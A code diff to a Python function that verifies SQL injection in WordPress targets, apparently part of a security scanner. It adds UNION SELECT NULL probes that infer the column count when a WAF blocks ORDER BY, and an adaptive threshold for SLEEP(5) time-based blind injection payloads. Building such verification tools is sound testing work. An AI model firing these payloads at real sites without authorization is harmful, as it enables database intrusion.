@@ -8605,6 +8605,31 @@ def verify_wordpress_sqli(
         except Exception:
             pass
 
+        # NULL-based fallback: when ORDER BY inference fails (WAF blocks ORDER BY keyword),
+        # probe UNION SELECT NULL,NULL,... with increasing column counts. A response that
+        # does NOT contain a SQL error or column-count complaint indicates the right count.
+        if _inferred_col_count is None:
+            _null_error_signals = ("wrong number", "operands", "different number",
+                                   "column count", "unknown column", "error in your sql",
+                                   "you have an error", "1222", "1241")
+            for _ncols_null in range(1, 9):
+                _null_p = (f"{orig_value} UNION SELECT "
+                           f"{','.join(['NULL'] * _ncols_null)}-- -")
+                try:
+                    _rn = send(_null_p)
+                    _rn_body = (_rn.text or "").lower()
+                    _rn_status = _rn.status_code
+                    _has_error = any(s in _rn_body for s in _null_error_signals)
+                    _prev_body_low = (base_resp.text or "").lower() if hasattr(base_resp, "text") else ""
+                    _same_as_base = (_rn_body[:200] == _prev_body_low[:200])
+                    if not _has_error and not _same_as_base and _rn_status < 500:
+                        _inferred_col_count = _ncols_null
+                        step(f"NULL inference: columnas = {_inferred_col_count} "
+                             f"(UNION SELECT {','.join(['NULL']*_ncols_null)} no devolvio error SQL)")
+                        break
+                except Exception:
+                    pass
+
         # Build ordered search: inferred count first, then remaining in both directions
         if _inferred_col_count and 1 <= _inferred_col_count <= 8:
             _col_search_order = [_inferred_col_count] + [
@@ -9231,6 +9256,24 @@ def verify_wordpress_sqli(
             (f"{orig_value}{_rq2}%09AND%09SLEEP(5)-- -",
              f"{orig_value}{_rq2}%09AND%09SLEEP(0)-- -"),
         ]
+        # Adaptive time threshold: measure 2 clean baseline requests before the attack loop.
+        # Under Docker load a plain request can take 1-2s; using fast_s as the per-payload
+        # baseline already factors out some jitter, but a global baseline helps calibrate the
+        # minimum delta we expect to see from SLEEP(5) on this specific container.
+        _baseline_times_tb = []
+        for _ in range(2):
+            try:
+                _t0_b = time.time()
+                send(orig_value)
+                _baseline_times_tb.append(time.time() - _t0_b)
+            except Exception:
+                pass
+        _tb_baseline = (sum(_baseline_times_tb) / len(_baseline_times_tb)
+                        if _baseline_times_tb else 0.5)
+        # Threshold: at minimum 3.5s differential; scale up if baseline is already >0.5s
+        _time_threshold = max(3.5, _tb_baseline * 2.5)
+        res.evidence["sqli_time_baseline_s"] = round(_tb_baseline, 2)
+        res.evidence["sqli_time_threshold_s"] = round(_time_threshold, 2)
         timing_tried = []
         timing_consistent = 0
         for slow_p, fast_p in timing_pairs:
@@ -9244,7 +9287,7 @@ def verify_wordpress_sqli(
             except Exception as e:
                 timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
                 continue
-            delayed = (slow_s - fast_s) >= 3.5
+            delayed = (slow_s - fast_s) >= _time_threshold
             timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
                                  "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
             if delayed:
